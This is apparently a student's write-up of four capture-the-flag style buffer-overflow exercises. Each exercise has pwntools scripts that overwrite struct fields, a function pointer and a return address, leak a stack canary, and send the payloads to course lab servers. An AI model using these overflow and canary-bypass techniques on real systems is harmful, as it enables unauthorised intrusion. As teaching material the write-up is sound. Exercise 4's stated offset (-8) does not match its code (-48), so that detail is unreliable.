## Exercise 1
### Vulnerability overview

The vulnerability of the code in exercise 1 lies in the fact that the variable `locals.buffer` is 16 char/bytes long, but the `fgets()` function on line 15 reads up to 1024 chars/bytes and assigns it to buffer. The vulnerability lies in the discrepancy between how much information the `locals.buffer` can hold and how much information the `fgets()` func can assign to it. Because the `locals.buffer` is the first property of a struct, the next property, `locals.secret` is very vulnerable. Conveniently this variable also is responsible for some important logic restricting the user from reaching the flag.

### How to exploit

The idea is to overwrite the `locals.buffer` and assign another value to the `locals.secret` variable. We should assign the value hexadecimal value, 'c0ffee' to the variable in order to access the part of the program that exploits the flag. I know that the properties of a struct is located after one another in memory. To exploit this program i simply fill the `locals.buffer` variable with junk data ('A' * 16) when asked for input, and additionally i overflow the buffer with 0xc0ffee which gets assigned to `locals.secret`. This grants me access to the flag!

### Code
```py
import pwn

target = 'oblig1.bufferoverflow.no'
port = 7001

payload = b"A" * 16 + pwn.p64(0xc0ffee)

remote = pwn.remote(target, port)

print(remote.recvline())

remote.sendline(payload)

print(remote.recvall())
remote.close()
```

## Exercise 2
### Vulnerability overview

Again the vulnerability lies in the possibility for a buffer overflow. The struct `locals` has two properties. After `locals.buffer` comes the variable `locals.func_pt`. Later in the program the function `pick_animal()` is assigned to `locals.func_pt`, and at last the function at `locals.func_pt` is called. But the possibility to overflow `locals.buffer`, and overwrite `locals.func_pt` represents a serious vulnerability. Part of the vulnerability also lies in the fact that there exists an unused function, `expose_flag()` which is never called. This function also happens to expose some information which should be kept secret...

### How to exploit

Here the idea is to get the `expose_flag()` function to be called, even though it is never really called by just running `main()`. This is done by filling the `locals.buffer` variable and writing the memory address of `expose_flag()` into `locals.func_pt`. When `locals.func_pt` is called on line 42, the flag will be revealed!

### Code
```py
import pwn

target = 'oblig1.bufferoverflow.no'
port = 7002

payload = b'A' * 32 + pwn.p64(0x4011a6)

remote = pwn.remote(target, port)

print(remote.recvline())

remote.sendline(payload)

print(remote.recvall())
remote.close()
```

## Exercise 3
### Vulnerability overview

In this program the vulnerability lies in the fact that there exists a variable `buffer` with size 16 chars/bytes that can be overflown. There also exists a function `expose_flag()` which is unused, but reveals a piece of information that should be kept secret. The program is equipped with a security mechanism called a stack canary. This security is meant to catch buffer overflows by assigning a randomly generated value to a specific location in the memory, and checking whetter this value stays persistent. If this value gets changed, the program will throw an error, and the exploitation attempt is stopped. The problem with this program is the fact that the stack canary-value can be revealed. In line 21 and 22 the variable `exploration_offset` is added to `buffer`, which is a pointer. This is called pointer arithmetic and because we can assign any value to `exploration_offset` with `scanf()` in line 18, we can essentially have a look at the value at any memory address in the stack. This is also part of the vulnerability in this program, because it makes it possible to retrieve the value of the stack canary.  

### How to exploit

To exploit this vulnerability we first need to understand where the stack canary is located. By running the program with gdb it is possible to see where the canary is located by investigating which memory locations near the `buffer` is changed over different reruns of the program. The amount of bytes from `buffer` to the stack canary must be typed in as the `exploration_offset` to reveal the value of the canary. Now we simply fetch the value of the canary, and create the payload which we assign to `buffer`. The payload must consist of:

<p>
&nbsp;&nbsp;&nbsp;&nbsp;Junk data to fill the buffer<br>
+ Junk data to fill the offset to the stack<br>
+ The value of the stack canary <br>
+ The offset to the return pointer<br>
+ The memory address of the `expose_flag()` function<br>
= payload to exploit the vulnerability and expose the flag
</p>

By inserting this payload we overwrite the return pointers value with a reference to the `expose_flag()` function. The function therefore gets called, and the flag is exposed!

### Code

target = 'oblig1.bufferoverflow.no'
port = '7003'

buffer_to_canary_offset = b'24'
bufferfill = b'A' * int(buffer_to_canary_offset)
canary_to_return_p_offset = b'B' * 8 * 1
expose_flag_adr = pwn.p64(0x4011a7)

remote = pwn.remote(target, port)

print(remote.recvline())
remote.sendline(buffer_to_canary_offset)

print(remote.recvline())
read_canary = remote.recvline()
print(read_canary)

canary_val = pwn.p64(int(read_canary, 16))

payload = bufferfill + canary_val + canary_to_return_p_offset + expose_flag_adr

remote.sendline(payload)

print(remote.recvall())
remote.close()

## Exercise 4
### Vulnerability overview

In this program a buffer overflow can overwrite the value of the variable, `input_wrapper.identifier`. Also, user input to the variable `offset`, and pointer arithmetic makes us able to reveal the value of the argument `secret`. These two variables are checked for equality to decide if the user should be granted access to the flag. The user being able to overwrite the value of `input_wrapper.identifier`, and knowing the value of `secret` makes up the security vulnerability in this program. So the goal for someone who wants to exploit the vulnerability would be to overwrite the value of `input_wrapper.identifier` to the same value as `secret` has.

### How to exploit

We see that this program starts by the `main()` function checking wether the argument count is less than two, and terminates the program if it is. If the argument count is 2 or higher the program runs the `program()` function. When we connect to the server where this program runs we get the output "Welcome, you have access to this program as: Guest". This tells us that the `program()` function has been called, which also means that argc for `main()` is more than 1 for this process. From the code, we can see that `main()` calls `program()` with `argv[1]` as the 7th argument, `secret`. This is important for understanding the vulnerability. When a function is called in a C program, the 6 first arguments are passed to the argument registers. Conveniently the 7th argument is pushed to the stack! We then know that the value of `secret` is located somewhere on the stack. We also know that by putting the right `offset` we can reveal the value of `secret` by pointer arithmetic, just like in Exercise 3. By running the program in gdb we find that `secret` is located 8 bytes before `input_wrapper.buffer`. By assigning '-8' to `offset` the value of `secret` will be printed on line 25. To exploit the program we now simply have to fetch the value that gets printed, and when prompted for input again we fill the buffer with 16 'A's followed by the fetched value of `secret` which overwrites the value of `input_wrapper.identifier`

### Code
```py
import pwn

target = 'oblig1.bufferoverflow.no'
port = '7004'

bufferfill = b'A' * 16
buffer_to_secret_dst = b'-48'

remote = pwn.remote(target, port)

print(remote.recvline())
print(remote.recvline())

remote.sendline(buffer_to_secret_dst)

print(remote.recvline())

read_secret = remote.recvline()
print(read_secret)

secret_val = pwn.p64(int(read_secret, 16))

print(remote.recvline())

remote.sendline(bufferfill + secret_val)

print(remote.recvall())
remote.close()
```
